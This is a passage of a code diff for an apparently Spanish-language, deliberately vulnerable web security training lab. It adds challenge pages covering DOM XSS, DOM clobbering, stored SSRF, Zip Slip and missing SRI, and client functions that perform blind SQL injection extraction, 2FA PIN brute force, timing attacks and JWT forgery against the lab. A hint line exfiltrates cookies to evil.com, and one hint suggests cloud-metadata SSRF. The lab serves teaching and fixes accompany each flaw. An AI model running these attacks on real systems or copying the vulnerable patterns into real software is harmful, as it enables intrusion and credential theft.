+} catch (e) {
+  res.status(500).json({ error: e.message, stack: e.stack });
+}
+
+<span class="fix">// FIX: log interno, mensaje genérico al cliente</span>
+} catch (e) {
+  console.error(e.stack); <span class="dim">// solo en logs internos</span>
+  res.status(500).json({ error: 'Internal Server Error' });
+}
+        </div>
+      </div>
+
+      <!-- HASH SIN SAL -->
+      <div id="page-nosalt" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔓 Hash sin sal — MD5 y Rainbow Tables</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">Las contraseñas se hashean con MD5 sin salt. MD5 es rápido (millones de hashes/seg) y sin salt los hashes son iguales para la misma contraseña. Servicios como CrackStation tienen rainbow tables con billones de hashes precalculados.</div>
+        <button class="btn btn-red" onclick="doNoSalt()">GET /api/hashes (ver hashes MD5 expuestos)</button>
+        <div class="output" id="nosalt-out">— Hashes MD5 sin sal —</div>
+        <div class="flag" id="flag-nosalt">🚩 FLAG{weak_hash_no_salt} — Contraseñas MD5 sin sal, crackeables con rainbow tables</div>
+        <button class="hint-btn" onclick="toggleHint('nosalt')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-nosalt">
+          Copia los hashes MD5 y pégalos en <a href="https://crackstation.net" style="color:#5DCAA5" target="_blank">crackstation.net</a>.<br>
+          Sin salt: <code>MD5("password123")</code> es siempre el mismo → en las tablas.<br>
+          Con salt: <code>MD5("password123" + randomSalt)</code> → único por usuario.<br>
+          <code>Fix:</code> Usar <code>bcrypt</code> o <code>argon2</code> que incluyen salt automáticamente y son lentos por diseño.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: MD5 sin sal</span>
+const hash = crypto.createHash('md5').update(password).digest('hex');
+<span class="dim">// Mismo password → mismo hash → rainbow table attack</span>
+
+<span class="fix">// FIX: bcrypt con salt</span>
+const bcrypt = require('bcrypt');
+const hash = await bcrypt.hash(password, 12); <span class="dim">// salt incluido automáticamente</span>
+const ok = await bcrypt.compare(input, hash);
+        </div>
+      </div>
+
+      <!-- COOKIE FLAGS -->
+      <div id="page-cookie" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🍪 Cookie Flags Ausentes</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">La cookie de sesión se establece sin los flags de seguridad <code style="color:#5DCAA5">HttpOnly</code>, <code style="color:#5DCAA5">Secure</code> ni <code style="color:#5DCAA5">SameSite</code>. Esto permite robarla con XSS (<code>document.cookie</code>), transmitirla en claro (HTTP) y usarla en ataques CSRF.</div>
+        <div class="split" style="margin-bottom:10px">
+          <div class="form-group" style="margin:0"><label>Username</label><input id="cookie-user" value="jsmith" /></div>
+          <div class="form-group" style="margin:0"><label>Password</label><input id="cookie-pass" value="password123" /></div>
+        </div>
+        <button class="btn btn-red" onclick="doCookieLogin()">POST /api/cookie-login</button>
+        <div class="output" id="cookie-out">— Set-Cookie header —</div>
+        <div class="flag" id="flag-cookie">🚩 FLAG{cookie_missing_flags} — Cookie de sesión sin protección, robable via XSS</div>
+        <button class="hint-btn" onclick="toggleHint('cookie')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-cookie">
+          Sin <code>HttpOnly</code>: <code>document.cookie</code> la expone en JS → robo via XSS.<br>
+          Sin <code>Secure</code>: se envía en HTTP → interceptable en redes no seguras.<br>
+          Sin <code>SameSite</code>: se incluye en requests cross-site → CSRF.<br>
+          <code>Fix:</code> <code>Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict; Path=/</code>
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: sin flags de seguridad</span>
+res.setHeader('Set-Cookie', `session_id=${user.id}; Path=/`);
+<span class="dim">// Accessible via document.cookie, enviada en HTTP, usable en CSRF</span>
+
+<span class="fix">// FIX: todos los flags</span>
+res.setHeader('Set-Cookie', `session_id=${token}; HttpOnly; Secure; SameSite=Strict; Path=/`);
+        </div>
+      </div>
+
+      <!-- DOM XSS -->
+      <div id="page-domxss" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">💉 DOM-based XSS — innerHTML sin sanitizar</div>
+          <span class="sev sev-crit" style="font-size:11px;padding:3px 8px;border-radius:4px">CRIT</span>
+        </div>
+        <div class="ch-desc">El XSS basado en DOM ocurre cuando JavaScript toma datos de una fuente controlable (como <code style="color:#5DCAA5">location.hash</code>) y los escribe en el DOM usando <code style="color:#5DCAA5">innerHTML</code>. No hay servidor involucrado — el servidor devuelve un HTML limpio, el XSS ocurre en el cliente.</div>
+        <div class="form-group"><label>Payload XSS (se pondrá en location.hash)</label><input id="domxss-payload" value='&lt;img src=x onerror=alert(document.cookie)&gt;' /></div>
+        <button class="btn btn-red" onclick="doDOMXSS()">Ejecutar DOM XSS (vía location.hash)</button>
+        <div style="margin-top:12px;padding:10px;background:#0d1425;border:1px solid #1e2a3a;border-radius:4px;font-size:12px;color:#94a3b8">
+          <div style="color:#475569;font-size:10px;margin-bottom:6px">Renderizado inseguro (innerHTML):</div>
+          <div id="domxss-render">— Aquí se renderizará el payload —</div>
+        </div>
+        <div class="output" id="domxss-out" style="margin-top:8px">— Resultado —</div>
+        <div class="flag" id="flag-domxss">🚩 FLAG{dom_based_xss} — Payload ejecutado via DOM sin pasar por el servidor</div>
+        <button class="hint-btn" onclick="toggleHint('domxss')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-domxss">
+          El flujo: <code>location.hash → innerHTML</code> — todo en el cliente.<br>
+          El servidor no ve el payload (el hash nunca se envía al servidor).<br>
+          Payload clásico: <code>&lt;img src=x onerror=alert(1)&gt;</code><br>
+          <code>Fix:</code> Usar <code>textContent</code> en lugar de <code>innerHTML</code>, o sanitizar con DOMPurify antes de insertar HTML.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: source → sink sin sanitizar</span>
+const source = location.hash.slice(1);       <span class="dim">// source: location.hash</span>
+document.getElementById('out').innerHTML = source; <span class="dim">// sink: innerHTML</span>
+
+<span class="fix">// FIX 1: usar textContent</span>
+document.getElementById('out').textContent = source;
+
+<span class="fix">// FIX 2: sanitizar si necesitas HTML</span>
+document.getElementById('out').innerHTML = DOMPurify.sanitize(source);
+        </div>
+      </div>
+
+      <!-- DOM CLOBBERING -->
+      <div id="page-domclob" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔨 DOM Clobbering — Sobrescribir variables globales con HTML</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">DOM Clobbering permite que un elemento HTML con <code style="color:#5DCAA5">id</code> o <code style="color:#5DCAA5">name</code> coincidente sobrescriba una variable JavaScript global. Si el código JS lee <code style="color:#5DCAA5">window.config</code> y un atacante puede inyectar <code style="color:#5DCAA5">&lt;a id="config" href="//evil.com"&gt;</code>, puede controlar ese valor.</div>
+        <div class="form-group"><label>HTML a inyectar (simula HTML controlado por atacante)</label><textarea id="domclob-html" rows="2">&lt;a id="config" href="//evil.com/steal"&gt;click&lt;/a&gt;</textarea></div>
+        <button class="btn btn-red" onclick="doDOMClob()" style="margin-bottom:10px">Inyectar y leer window.config</button>
+        <div id="domclob-container" style="display:none;padding:10px;background:#0d1425;border:1px solid #1e2a3a;border-radius:4px;margin-bottom:10px;font-size:12px;color:#94a3b8">
+          <div style="color:#475569;font-size:10px;margin-bottom:6px">Contenido inyectado en el DOM:</div>
+          <div id="domclob-render"></div>
+        </div>
+        <div class="output" id="domclob-out">— Valor de window.config leído por JS —</div>
+        <div class="flag" id="flag-domclob">🚩 FLAG{dom_clobbering} — Variable global JS sobrescrita por elemento HTML</div>
+        <button class="hint-btn" onclick="toggleHint('domclob')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-domclob">
+          En HTML, <code>&lt;a id="x"&gt;</code> hace que <code>window.x</code> apunte al elemento DOM.<br>
+          Si el código JS hace <code>fetch(window.config.apiUrl)</code> y el atacante controla <code>window.config</code>...<br>
+          Puede forzar requests a dominios maliciosos o causar errores inesperados.<br>
+          <code>Fix:</code> No depender de variables globales que puedan ser clobbered. Usar módulos ES6, variables con <code>const</code>/declaración explícita, y validar tipos antes de usar valores de <code>window.*</code>.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: código JS lee window.config</span>
+fetch(window.config.apiUrl + '/data'); <span class="dim">// si window.config = &lt;a href="//evil.com"&gt;</span>
+<span class="dim">// → window.config es el elemento DOM, .apiUrl = undefined</span>
+<span class="dim">// → o window.config.toString() = "//evil.com" si se usa como string</span>
+
+<span class="fix">// FIX: declarar variables explícitamente</span>
+const config = { apiUrl: 'https://api.miapp.com' }; <span class="dim">// no en window</span>
+<span class="dim">// Las variables locales no pueden ser clobbered por HTML</span>
+        </div>
+      </div>
+
+      <!-- STORED SSRF -->
+      <div id="page-ssrf2" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🌐 Stored SSRF — URL guardada y fetchada después</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">En el SSRF almacenado, la URL maliciosa no se fetcha inmediatamente — se guarda primero y se fetcha al disparar el webhook. El origen del SSRF es indirecto, lo que hace más difícil detectarlo con controles simples en el punto de entrada.</div>
+        <div class="step-label">Paso 1 — Guardar webhook con URL maliciosa</div>
+        <div class="split" style="margin-bottom:6px">
+          <div class="form-group" style="margin:0"><label>ID del webhook</label><input id="ssrf2-id" value="hook1" /></div>
+          <div class="form-group" style="margin:0"><label>URL (prueba con metadata interna)</label><input id="ssrf2-url" value="http://localhost:3000/api/health" /></div>
+        </div>
+        <button class="btn btn-amber" onclick="doSSRF2Save()">POST /api/webhook/save</button>
+        <div class="output" id="ssrf2-save-out">— Webhook guardado —</div>
+        <div class="step-label">Paso 2 — Disparar el webhook (el servidor fetcha la URL)</div>
+        <button class="btn btn-red" onclick="doSSRF2Trigger()">POST /api/webhook/trigger</button>
+        <div class="output" id="ssrf2-out">— Respuesta del servidor remoto —</div>
+        <div class="flag" id="flag-ssrf2">🚩 FLAG{stored_ssrf} — SSRF almacenado: servidor fetchó URL interna vía webhook</div>
+        <button class="hint-btn" onclick="toggleHint('ssrf2')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-ssrf2">
+          Prueba URLs internas: <code>http://localhost:3000/api/debug</code>, <code>http://169.254.169.254/</code> (metadata AWS)<br>
+          El SSRF es indirecto: el "guardado" pasa controles, el "trigger" hace el request interno.<br>
+          <code>Fix:</code> Validar URLs al guardar (allowlist de dominios), no al ejecutar. Bloquear rangos internos (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8).
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: guarda sin validar, fetcha sin validar</span>
+app.post('/api/webhook/save', (req, res) => {
+  webhooks[id] = url; <span class="dim">// sin validar destino</span>
+});
+app.post('/api/webhook/trigger', (req, res) => {
+  http.get(webhooks[id]); <span class="dim">// fetcha URL almacenada</span>
+});
+
+<span class="fix">// FIX: allowlist de dominios al guardar</span>
+const allowed = ['api.trusted.com', 'hooks.partner.com'];
+if (!allowed.includes(new URL(url).hostname)) return res.status(400).json({ error: 'Dominio no permitido' });
+        </div>
+      </div>
+
+      <!-- ZIP SLIP -->
+      <div id="page-zipslip" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🗜️ Zip Slip — Path Traversal en extracción ZIP</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">Un archivo ZIP puede contener entradas con rutas como <code style="color:#5DCAA5">../../etc/cron.d/evil</code>. Si el servidor extrae sin validar que el destino está dentro del directorio objetivo, los archivos se escriben fuera — potencialmente sobreescribiendo archivos del sistema.</div>
+        <div class="step-label">Paso 1 — Descargar ZIP malicioso generado por el servidor</div>
+        <button class="btn btn-amber" onclick="doZipDownload()">GET /api/zipslip/malicious (descargar ZIP con path traversal)</button>
+        <div class="output" id="zipslip-dl-out">— ZIP descargado —</div>
+        <div class="step-label">Paso 2 — Subir el ZIP malicioso para extracción</div>
+        <div class="form-group" style="margin-top:10px"><label>Archivo ZIP a extraer</label><input id="zipslip-file" type="file" accept=".zip" /></div>
+        <button class="btn btn-red" onclick="doZipUpload()">POST /api/unzip (extraer sin validación)</button>
+        <div class="output" id="zipslip-out">— Entradas extraídas —</div>
+        <div class="flag" id="flag-zipslip">🚩 FLAG{zip_slip_traversal} — Archivo escrito fuera del directorio de extracción</div>
+        <button class="hint-btn" onclick="toggleHint('zipslip')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-zipslip">
+          El ZIP malicioso contiene: <code>../../tmp/zipslip_pwned.txt</code><br>
+          Sin validación, el archivo se escribe en <code>/tmp/</code> en lugar del directorio destino.<br>
+          En escenarios reales: sobreescribir configs, cron jobs, SSH keys.<br>
+          <code>Fix:</code> Resolver la ruta completa y verificar que empieza por el directorio destino antes de escribir.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: no verifica que destPath esté en DEST</span>
+const destPath = path.join(DEST, entry.entryName);
+fs.writeFileSync(destPath, entry.getData()); <span class="dim">// puede escribir en /tmp/, /etc/, etc.</span>
+
+<span class="fix">// FIX: verificar que el path está dentro del destino</span>
+const destPath = path.resolve(DEST, entry.entryName);
+if (!destPath.startsWith(path.resolve(DEST))) {
+  throw new Error('Zip Slip detectado: ' + entry.entryName);
+}
+        </div>
+      </div>
+
+      <!-- SRI AUSENTE -->
+      <div id="page-sri" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🛡️ Subresource Integrity (SRI) Ausente</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">Cargar scripts de CDN sin el atributo <code style="color:#5DCAA5">integrity</code> crea una dependencia de seguridad en un tercero. Si el CDN es comprometido y sirve un script modificado, tu aplicación ejecuta código malicioso en todos tus usuarios sin ninguna advertencia.</div>
+        <button class="btn" onclick="doSRICheck()" style="margin-bottom:12px">Verificar headers de seguridad del lab</button>
+        <div class="output" id="sri-out">— Resultado —</div>
+        <div class="flag" id="flag-sri">🚩 FLAG{sri_missing} — Script cargado desde CDN sin verificación de integridad</div>
+        <button class="hint-btn" onclick="toggleHint('sri')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-sri">
+          Un CDN comprometido podría inyectar: <code>document.location='//evil.com?c='+document.cookie</code><br>
+          SRI previene esto verificando el hash del archivo antes de ejecutarlo.<br>
+          Generación: <code>openssl dgst -sha384 -binary script.js | openssl base64 -A</code><br>
+          O: <a href="https://www.srihash.org" style="color:#5DCAA5" target="_blank">srihash.org</a>
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">&lt;!-- VULNERABLE: sin SRI --&gt;</span>
+&lt;script src="https://cdn.example.com/jquery.min.js"&gt;&lt;/script&gt;
+<span class="dim">&lt;!-- Si el CDN es comprometido → código malicioso ejecutado en todos los usuarios --&gt;</span>
+
+<span class="fix">&lt;!-- FIX: con SRI + crossorigin --&gt;</span>
+&lt;script
+  src="https://cdn.example.com/jquery.min.js"
+  integrity="sha384-<span class="fix">HASH_SHA384_DEL_ARCHIVO</span>"
+  crossorigin="anonymous"&gt;
+&lt;/script&gt;
+<span class="dim">&lt;!-- El browser verifica el hash antes de ejecutar — si no coincide, error --&gt;</span>
+        </div>
+      </div>
+
     </div><!-- /content -->
   </main>
 </div>
@@ -1772,6 +2460,454 @@ async function doHostHdr() {
     setOut('hosthdr-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
     if (d.flag) { $('flag-hosthdr').classList.add('show'); markSolved('hosthdr'); }
   } catch(e) { setOut('hosthdr-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Second-order SQLi ─────────────────────────
+async function doSQLi2Store() {
+  const user_id = $('sqli2-uid').value;
+  const username = $('sqli2-uname').value;
+  setOut('sqli2-store-out', 'Guardando...', '');
+  try {
+    const r = await fetch(API + '/api/update-username', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ user_id, username })
+    });
+    const d = await r.json();
+    setOut('sqli2-store-out', JSON.stringify(d, null, 2), d.success ? 'ok' : 'err');
+  } catch(e) { setOut('sqli2-store-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doSQLi2Greet() {
+  const user_id = $('sqli2-uid').value;
+  setOut('sqli2-out', 'Ejecutando segunda query...', '');
+  try {
+    const r = await fetch(API + '/api/greet?id=' + encodeURIComponent(user_id));
+    const d = await r.json();
+    setOut('sqli2-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : (d.error ? 'err' : ''));
+    if (d.flag) { $('flag-sqli2').classList.add('show'); markSolved('sqli2'); }
+  } catch(e) { setOut('sqli2-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Blind SQLi ────────────────────────────────
+async function doBlindSQL() {
+  const username = $('blindsql-q').value;
+  setOut('blindsql-out', 'Consultando...', '');
+  try {
+    const r = await fetch(API + '/api/user-exists?username=' + encodeURIComponent(username));
+    const d = await r.json();
+    setOut('blindsql-out', JSON.stringify(d, null, 2), d.exists ? 'ok' : '');
+    if (d.flag) { $('flag-blindsql').classList.add('show'); markSolved('blindsql'); }
+  } catch(e) { setOut('blindsql-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doBlindBrute() {
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$';
+  let found = '';
+  setOut('blindsql-out', 'Extrayendo password del admin...', '');
+  for (let pos = 1; pos <= 20; pos++) {
+    let charFound = false;
+    for (const c of charset) {
+      const payload = `admin' AND SUBSTRING(password,${pos},1)='${c}`;
+      const r = await fetch(API + '/api/user-exists?username=' + encodeURIComponent(payload));
+      const d = await r.json();
+      if (d.exists) {
+        found += c;
+        setOut('blindsql-out', `Extrayendo: ${found}${'?'.repeat(Math.max(0, pos - found.length))}`, 'ok');
+        charFound = true;
+        break;
+      }
+    }
+    if (!charFound) break;
+  }
+  setOut('blindsql-out', `Password extraída: "${found}"\n\nFlag obtenida via Blind SQLi`, 'ok');
+  $('flag-blindsql').classList.add('show');
+  markSolved('blindsql');
+}
+
+// ── Session Fixation ──────────────────────────
+async function doSessionFixLogin() {
+  const username = $('sessionfix-user').value;
+  const password = $('sessionfix-pass').value;
+  const sid = $('sessionfix-sid').value;
+  setOut('sessionfix-login-out', 'Haciendo login con SID fijado...', '');
+  try {
+    const r = await fetch(API + '/api/session/login', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ username, password, sid })
+    });
+    const d = await r.json();
+    setOut('sessionfix-login-out', JSON.stringify(d, null, 2), d.success ? 'ok' : 'err');
+  } catch(e) { setOut('sessionfix-login-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doSessionFixHijack() {
+  const sid = $('sessionfix-sid').value;
+  setOut('sessionfix-out', 'Accediendo con SID conocido del atacante...', '');
+  try {
+    const r = await fetch(API + '/api/session/profile?sid=' + encodeURIComponent(sid));
+    const d = await r.json();
+    setOut('sessionfix-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : 'err');
+    if (d.flag) { $('flag-sessionfix').classList.add('show'); markSolved('sessionfix'); }
+  } catch(e) { setOut('sessionfix-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── JWT Algorithm Confusion ───────────────────
+let _jwtconfForged = '';
+
+async function doJWTConfToken() {
+  const username = $('jwtconf-user').value;
+  const password = $('jwtconf-pass').value;
+  try {
+    const r = await fetch(API + '/api/rs256/token', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ username, password })
+    });
+    const d = await r.json();
+    $('jwtconf-token-box').textContent = d.token || JSON.stringify(d);
+    setOut('jwtconf-pubkey-out', d.error || 'Token RS256 obtenido. Ahora ve la clave pública.', d.token ? 'ok' : 'err');
+  } catch(e) { $('jwtconf-token-box').textContent = 'Error: ' + e.message; }
+}
+
+async function doJWTConfPubkey() {
+  try {
+    const r = await fetch(API + '/api/rs256/pubkey');
+    const d = await r.json();
+    setOut('jwtconf-pubkey-out', d.publicKey + '\n\n' + d.hint, 'ok');
+  } catch(e) { setOut('jwtconf-pubkey-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doJWTConfForge() {
+  try {
+    const r = await fetch(API + '/api/rs256/forge', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ username: 'hacker', role: 'admin' })
+    });
+    const d = await r.json();
+    _jwtconfForged = d.forged_token || '';
+    $('jwtconf-forged-box').textContent = _jwtconfForged || JSON.stringify(d);
+    setOut('jwtconf-out', d.note || 'Token forjado. Ahora accede al flag.', _jwtconfForged ? 'ok' : 'err');
+  } catch(e) { $('jwtconf-forged-box').textContent = 'Error: ' + e.message; }
+}
+
+async function doJWTConfFlag() {
+  if (!_jwtconfForged) return setOut('jwtconf-out', 'Primero forja el token (Paso 3)', 'err');
+  try {
+    const r = await fetch(API + '/api/rs256/flag', {
+      headers: { 'Authorization': 'Bearer ' + _jwtconfForged }
+    });
+    const d = await r.json();
+    setOut('jwtconf-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : 'err');
+    if (d.flag) { $('flag-jwtconf').classList.add('show'); markSolved('jwtconf'); }
+  } catch(e) { setOut('jwtconf-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── 2FA Brute Force ───────────────────────────
+async function do2FASetup() {
+  setOut('twofa-setup-out', 'Generando PIN...', '');
+  try {
+    const r = await fetch(API + '/api/2fa/setup', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ user_id: '1' })
+    });
+    const d = await r.json();
+    setOut('twofa-setup-out', JSON.stringify(d, null, 2) + '\n\n(En escenario real, el PIN llega al móvil de la víctima — el atacante no lo conoce)', 'ok');
+  } catch(e) { setOut('twofa-setup-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function do2FABrute() {
+  setOut('twofa-out', 'Iniciando brute force de PIN 0000-9999...', '');
+  for (let i = 0; i <= 9999; i++) {
+    const code = String(i).padStart(4, '0');
+    const r = await fetch(API + '/api/2fa/verify', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ user_id: '1', code })
+    });
+    const d = await r.json();
+    if (d.success) {
+      setOut('twofa-out', `PIN encontrado: ${code}\nIntentos: ${d.attempts}\n\n${JSON.stringify(d, null, 2)}`, 'ok');
+      $('flag-twofa').classList.add('show');
+      markSolved('twofa');
+      return;
+    }
+    if (i % 100 === 0) {
+      setOut('twofa-out', `Probando... ${code} (${((i/10000)*100).toFixed(0)}%)`, '');
+      await new Promise(resolve => setTimeout(resolve, 0));
+    }
+  }
+}
+
+// ── OAuth State ───────────────────────────────
+let _oauthCode = '';
+
+async function doOAuthAuthorize() {
+  setOut('oauth-authorize-out', 'Solicitando autorización sin state...', '');
+  try {
+    const r = await fetch(API + '/api/oauth/authorize?redirect_uri=' + encodeURIComponent($('oauth-redir').value));
+    const d = await r.json();
+    _oauthCode = d.code || '';
+    setOut('oauth-authorize-out', JSON.stringify(d, null, 2), 'ok');
+  } catch(e) { setOut('oauth-authorize-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doOAuthCallback() {
+  if (!_oauthCode) return setOut('oauth-out', 'Primero haz el Authorize (Paso 1)', 'err');
+  setOut('oauth-out', 'Completando callback sin state...', '');
+  try {
+    const r = await fetch(API + '/api/oauth/callback?code=' + _oauthCode);
+    const d = await r.json();
+    setOut('oauth-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-oauth').classList.add('show'); markSolved('oauth'); }
+  } catch(e) { setOut('oauth-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Weak PRNG ─────────────────────────────────
+async function doPRNGToken() {
+  setOut('prng-token-out', 'Generando...', '');
+  try {
+    const r = await fetch(API + '/api/prng/token', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ user_id: '1' })
+    });
+    const d = await r.json();
+    setOut('prng-token-out', JSON.stringify(d, null, 2), 'ok');
+  } catch(e) { setOut('prng-token-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doPRNGSamples() {
+  setOut('prng-out', 'Generando muestras...', '');
+  try {
+    const r = await fetch(API + '/api/prng/samples');
+    const d = await r.json();
+    setOut('prng-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-prng').classList.add('show'); markSolved('prng'); }
+  } catch(e) { setOut('prng-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Timing Attack ─────────────────────────────
+async function doTiming() {
+  const guess = $('timing-guess').value;
+  setOut('timing-out', 'Midiendo tiempo...', '');
+  try {
+    const r = await fetch(API + '/api/timing/check', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ guess })
+    });
+    const d = await r.json();
+    setOut('timing-out', `Guess: "${guess}"\nMatch: ${d.match}\nTiempo: ${d.elapsed_ms}ms\n\n${d.hint}`, d.match ? 'ok' : '');
+    if (d.flag) { $('flag-timing').classList.add('show'); markSolved('timing'); }
+  } catch(e) { setOut('timing-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doTimingBrute() {
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$_';
+  let found = '';
+  setOut('timing-out', 'Extrayendo secreto por timing...', '');
+  for (let pos = 0; pos < 20; pos++) {
+    let maxTime = -1, bestChar = '';
+    for (const c of charset) {
+      const r = await fetch(API + '/api/timing/check', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ guess: found + c })
+      });
+      const d = await r.json();
+      if (d.match) {
+        found += c;
+        setOut('timing-out', `Secreto encontrado: "${found}"`, 'ok');
+        $('flag-timing').classList.add('show');
+        markSolved('timing');
+        return;
+      }
+      if (parseFloat(d.elapsed_ms) > maxTime) { maxTime = parseFloat(d.elapsed_ms); bestChar = c; }
+    }
+    found += bestChar;
+    setOut('timing-out', `Extrayendo: "${found}" (pos ${pos+1}, ${maxTime.toFixed(1)}ms)`, '');
+  }
+}
+
+// ── Email Header Injection ────────────────────
+async function doEmailInj() {
+  const name = $('emailinj-name').value;
+  const email = $('emailinj-email').value;
+  const message = $('emailinj-msg').value;
+  setOut('emailinj-out', 'Enviando...', '');
+  try {
+    const r = await fetch(API + '/api/contact', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ name, email, message })
+    });
+    const d = await r.json();
+    setOut('emailinj-out', `Headers usados por el servidor:\n\n${d.headers_used}\n\n${d.note}`, d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-emailinj').classList.add('show'); markSolved('emailinj'); }
+  } catch(e) { setOut('emailinj-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── HTTP Parameter Pollution ──────────────────
+async function doHPP() {
+  const id1 = $('hpp-id1').value;
+  const id2 = $('hpp-id2').value;
+  setOut('hpp-out', 'Enviando request con parámetros duplicados...', '');
+  try {
+    const r = await fetch(API + '/api/items?id=' + encodeURIComponent(id1) + '&id=' + encodeURIComponent(id2));
+    const d = await r.json();
+    setOut('hpp-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-hpp').classList.add('show'); markSolved('hpp'); }
+  } catch(e) { setOut('hpp-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Excessive Data Exposure ───────────────────
+async function doEDE() {
+  setOut('ede-out', 'Obteniendo todos los usuarios...', '');
+  try {
+    const r = await fetch(API + '/api/users/all');
+    const d = await r.json();
+    setOut('ede-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-ede').classList.add('show'); markSolved('ede'); }
+  } catch(e) { setOut('ede-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Debug Endpoint ────────────────────────────
+async function doDebug() {
+  setOut('debug-out', 'Accediendo al endpoint de debug...', '');
+  try {
+    const r = await fetch(API + '/api/debug');
+    const d = await r.json();
+    setOut('debug-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-debug').classList.add('show'); markSolved('debug'); }
+  } catch(e) { setOut('debug-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Stack Trace ───────────────────────────────
+async function doStackTrace() {
+  const input = $('stacktrace-input').value;
+  setOut('stacktrace-out', 'Enviando input para provocar error...', '');
+  try {
+    const r = await fetch(API + '/api/crash?input=' + encodeURIComponent(input));
+    const d = await r.json();
+    setOut('stacktrace-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : (d.error ? 'err' : ''));
+    if (d.flag) { $('flag-stacktrace').classList.add('show'); markSolved('stacktrace'); }
+  } catch(e) { setOut('stacktrace-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Hash sin sal ──────────────────────────────
+async function doNoSalt() {
+  setOut('nosalt-out', 'Obteniendo hashes...', '');
+  try {
+    const r = await fetch(API + '/api/hashes');
+    const d = await r.json();
+    setOut('nosalt-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : '');
+    if (d.flag) { $('flag-nosalt').classList.add('show'); markSolved('nosalt'); }
+  } catch(e) { setOut('nosalt-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Cookie Flags ──────────────────────────────
+async function doCookieLogin() {
+  const username = $('cookie-user').value;
+  const password = $('cookie-pass').value;
